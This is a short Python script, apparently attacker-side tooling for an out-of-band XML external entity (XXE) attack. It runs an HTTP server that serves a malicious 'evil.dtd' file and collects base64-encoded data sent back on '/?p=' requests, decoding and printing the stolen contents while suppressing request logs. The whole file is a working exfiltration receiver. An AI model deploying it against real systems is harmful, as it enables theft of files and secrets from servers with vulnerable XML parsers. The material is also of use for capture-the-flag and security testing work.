from http.server import HTTPServer,BaseHTTPRequestHandler
import base64,os

class myHandler(BaseHTTPRequestHandler):

    data = []

    def do_GET(self):
        # Handle evil.dtd
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        if self.path.endswith('.dtd'):
            f = open(os.getcwd()+'/evil.dtd','rb')
            self.wfile.write(f.read())

        # Handle receives base64 requests and print to the console >
        elif self.path.startswith('/?p='):
            self.send_response(200)
            self.end_headers()
            data = self.path.removeprefix("/?p=")
            decode_data = base64.b64decode(data)
            rawdata = decode_data.decode()
            self.data.append(rawdata)
            if len(self.data) == 2:
                print(self.data[0])
                self.data.clear()
            else:
                pass
        else:
            self.send_error(404)

    def log_message(self, format, *args):
        return


def server():
    port = 8000
    server = HTTPServer(('',port),myHandler)
    print("listening on port",port)
    server.serve_forever()
